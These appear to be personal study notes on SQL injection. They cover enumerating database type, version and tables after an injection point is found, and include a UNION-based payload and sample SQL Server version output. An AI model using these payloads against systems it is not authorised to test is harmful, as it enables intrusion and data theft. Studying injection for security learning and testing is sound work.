--- ---

<h2>Examining the Database</h2>

Following initial identification of an SQL injection vulnerability, it is generally useful to obtain
some information about the database itself. This information can often pave the way for further
exploitation.
- Specific syntax depends on the database type

Enumerating Version (Oracle)
```
SELECT * FROM v$version
```

Enumerating Tables
```
SELECT * FROM information_schema.tables
```

---

<h2>More Examination</h2>

Information you need to gather:
- Type of database software
- Version of database software
- Contents of the database (columns and tables)


Querying the Database Type and Version
![[Pasted image 20221210161338.png]]

Example of using a UNION attack:
```
' UNION SELECT @@version--
```

Might return the following version information:
```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build
14393: ) (Hypervisor)
```
